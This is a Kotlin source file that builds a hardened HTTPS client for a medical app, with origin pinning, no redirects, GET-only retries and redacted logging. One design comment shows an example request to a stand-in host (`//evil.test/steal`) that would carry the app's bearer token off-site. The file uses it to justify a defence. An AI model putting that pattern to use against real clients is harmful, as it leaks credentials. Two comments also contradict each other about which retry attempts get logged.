package com.luismejias.lumemedlink.core.networking

import com.luismejias.lumemedlink.shared.AppError
import io.ktor.client.HttpClient
import io.ktor.client.engine.HttpClientEngine
import io.ktor.client.plugins.HttpRequestRetry
import io.ktor.client.plugins.HttpResponseValidator
import io.ktor.client.plugins.HttpTimeout
import io.ktor.client.plugins.api.Send
import io.ktor.client.plugins.api.createClientPlugin
import io.ktor.client.plugins.contentnegotiation.ContentNegotiation
import io.ktor.client.plugins.defaultRequest
import io.ktor.client.statement.request
import io.ktor.http.HttpHeaders
import io.ktor.http.HttpMethod
import io.ktor.http.URLProtocol
import io.ktor.http.Url
import io.ktor.serialization.kotlinx.json.json
import kotlinx.coroutines.CancellationException
import kotlinx.io.IOException
import kotlinx.serialization.json.Json
import kotlin.random.Random

/** Scheme + host + port. Requests may only travel to the one this stack was built for. */
private data class Origin(val scheme: String, val host: String, val port: Int)

/** Correlation header, one fresh id per logical request (retries share it on purpose). */
internal const val RID_HEADER: String = "X-Lume-Request-Id"

// Explicit timeouts (ADR-0004): a default is not a decision.
private const val CONNECT_TIMEOUT_MS = 10_000L
private const val REQUEST_TIMEOUT_MS = 30_000L
private const val SOCKET_TIMEOUT_MS = 30_000L

// Bounded retry, GET only — POST/PATCH never retry without idempotency keys, which are an
// app+backend matter (backend trap T13), not something the stack invents.
private const val MAX_RETRIES_GET = 2

// Tolerant contract decoding: an unknown field costs nothing (the lesson the ecosystem board
// records for 0.13.x — string-not-enum fields exist so a future value costs a row, not the page).
private val contractJson = Json { ignoreUnknownKeys = true }

/**
 * The ONE HttpClient factory of this app (ADR-0004, doctrine mirror of LumeNetworking). Every
 * byte of network traffic goes through a client built here; detekt's ForbiddenImport keeps Ktor,
 * OkHttp and HttpURLConnection unreachable outside core/.
 *
 * Hardening, in order: the base URL must be https at CONSTRUCTION (an `http://` base throws here,
 * not at call time); every request is then pinned to that exact ORIGIN — scheme, host and port —
 * not merely to "some https URL"; redirects are never followed; timeouts are explicit; retries are
 * bounded and GET-only; every non-2xx maps to the [AppError] taxonomy via [AppErrorException], and
 * transport failures are mapped too so no engine message escapes with a URL in it.
 *
 * Why the origin check and not a protocol check, learned the hard way (ADR-0016): a protocol check
 * passes `client.get("//evil.test/steal")`. That string reads like a relative path, `defaultRequest`
 * supplies the https scheme, and the request leaves for another host **with this app's bearer token
 * attached** — while the redacted log records only `GET /steal`, so the host never appears anywhere.
 * The generated contract client will hand this stack whole URLs out of `next`/`self` link fields,
 * which is exactly that shape.
 *
 * Note on log volume, stated because the opposite was documented for a while: EVERY attempt of a
 * retried call is logged, not just the final one. That is the more useful behaviour and it is what
 * a test now pins.
 *
 * @param engine injected so production wires [platformHttpEngine] and tests wire MockEngine.
 */
internal fun lumeHttpClient(
    baseUrl: String,
    engine: HttpClientEngine,
    logSink: NetworkLogSink,
    tokenProvider: TokenProvider? = null,
): HttpClient {
    require(baseUrl.startsWith("https://")) {
        "LumeHttpStack is https-only and fails closed: refused to build over '$baseUrl' (ADR-0004)."
    }
    val allowedOrigin = Url(baseUrl).let { Origin(it.protocol.name, it.host, it.port) }
    return HttpClient(engine) {
        followRedirects = false
        expectSuccess = false

        install(HttpTimeout) {
            connectTimeoutMillis = CONNECT_TIMEOUT_MS
            requestTimeoutMillis = REQUEST_TIMEOUT_MS
            socketTimeoutMillis = SOCKET_TIMEOUT_MS
        }

        install(ContentNegotiation) { json(contractJson) }

        install(HttpRequestRetry) {
            maxRetries = MAX_RETRIES_GET
            retryIf { request, response ->
                request.method == HttpMethod.Get && response.status.value in 500..599
            }
            retryOnExceptionIf { request, cause ->
                request.method == HttpMethod.Get && cause is IOException
            }
            exponentialDelay()
        }

        defaultRequest { url(baseUrl) }

        install(lumeStackGuard(allowedOrigin, logSink, tokenProvider))

        HttpResponseValidator {
            validateResponse { response ->
                if (response.status.value !in 200..299) {
                    throw AppErrorException(response.toAppError())
                }
            }
        }
    }
}

/**
 * The stack's own guard plugin: per-request https check, correlation id, bearer attachment, and
 * the redacted log line — method/path/status/rid and NOTHING else (§8.1). Only the final response
 * of a retried call is logged; retries share the logical request's rid.
 */
private fun lumeStackGuard(allowedOrigin: Origin, logSink: NetworkLogSink, tokenProvider: TokenProvider?) =
    createClientPlugin("LumeStackGuard") {
        // Transport and timeout failures are mapped HERE, and their original is dropped on the
        // floor — message and cause chain both. Ktor's own message is
        // `Request timeout has expired [url=https://…/patients/11111111-1?rut=11111111-1…]`: the
        // full URL WITH its query, which is precisely what the redacted log line exists to keep
        // out of a crash report or a generic catch (§8.1). Mapping only the HTTP statuses, as this
        // stack did before ADR-0016, left that door open.
        //
        // The catch is deliberately broad: the goal is that NO engine exception escapes carrying a
        // URL, and an exhaustive list of engine exception types is a list that goes stale. Errors
        // still propagate (Exception, not Throwable) and cancellation is re-thrown untouched, since
        // swallowing it would break structured concurrency (§6).
        // SwallowedException is suppressed with its premise inverted: the rule protects you from
        // losing an original exception, and here losing it is the requirement — the original is
        // what carries the URL and its query. Chaining it as `cause` would defeat the whole fix.
        @Suppress("TooGenericExceptionCaught", "SwallowedException")
        on(Send) { request ->
            try {
                proceed(request)
            } catch (cancellation: CancellationException) {
                throw cancellation
            } catch (alreadyMapped: AppErrorException) {
                throw alreadyMapped
            } catch (transport: Exception) {
                throw AppErrorException(AppError.Retryable(status = null))
            }
        }

        onRequest { request, _ ->
            check(request.url.protocol == URLProtocol.HTTPS) {
                "LumeHttpStack is https-only and fails closed: refused ${request.url.protocol.name}://"
            }
            // The ORIGIN, not just the scheme. The message names no host: an error string is a
            // side channel like any other, and this one would be read by whoever triggered it.
            check(Origin(request.url.protocol.name, request.url.host, request.url.port) == allowedOrigin) {
                "LumeHttpStack refused a request to an origin other than its own (ADR-0016)."
            }
            if (request.headers[RID_HEADER] == null) {
                request.headers.append(RID_HEADER, newRid())
            }
            tokenProvider?.token()?.let { token ->
                request.headers.append(HttpHeaders.Authorization, "Bearer $token")
            }
        }
        onResponse { response ->
            val request = response.request
            if (response.status.value == 401) {
                tokenProvider?.tokenWasRejected()
            }
            logSink.log(
                NetworkLogEntry.of(
                    method = request.method.value,
                    // encodedPath only — the query never reaches a log line — and `of` additionally
                    // redacts identifier-shaped segments, because this app's routes carry the
                    // patient id IN the path (§8.1, ADR-0016).
                    rawPath = request.url.encodedPath,
                    status = response.status.value,
                    rid = request.headers[RID_HEADER] ?: "-",
                ),
            )
        }
    }

// Correlation id, not a secret: plain Random is the point (cheap, per-request), crypto-strength
// randomness buys nothing here.
private fun newRid(): String = buildString(capacity = 32) {
    repeat(16) { append(Random.nextInt(256).toString(16).padStart(2, '0')) }
}
